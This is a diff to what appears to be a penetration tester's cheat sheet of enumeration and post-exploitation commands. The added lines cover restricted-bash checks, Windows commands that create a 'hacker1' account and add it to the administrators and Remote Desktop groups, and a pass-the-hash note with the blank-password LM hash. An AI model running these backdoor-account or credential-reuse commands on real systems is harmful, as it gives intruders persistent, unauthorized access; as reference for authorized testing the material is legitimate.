@@ -5,7 +5,7 @@
 credits: g0tm1lk
 
 #distribution type
-cat /etc/issue
+cat /etc/*issue
 cat /etc/*-release
 
 #show kernel version
@@ -45,7 +45,15 @@ su root2
 
 
 
+######################################
+######## FML! RESTRICTED BASH! #######
+######################################
 
+#check exported variables
+export -p
+
+#check path
+echo $PATH
 
 
 
@@ -118,7 +126,12 @@ tasklist /v /fi "username eq system"
 #Find out patches are installed
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 
-
+#############################
+##### ADD USER TO GROUP #####
+#############################
+net user hacker1 secretpassword /add
+net localgroup administrators hacker1 /add
+net localgroup "Remote Desktop users" hacker1 /add
 
 #############################
 #### ACCESSING SMB SHARE ####
@@ -287,8 +300,11 @@ tasklist | FIND "my process"
 taskkill /F /PID 1242
 
 
+#########################
+### PASSING THE HASH ####
+#########################
 
-
+LMHASH for no password = aad3b435b51404eeaad3b435b51404ee
 
 
 ====================
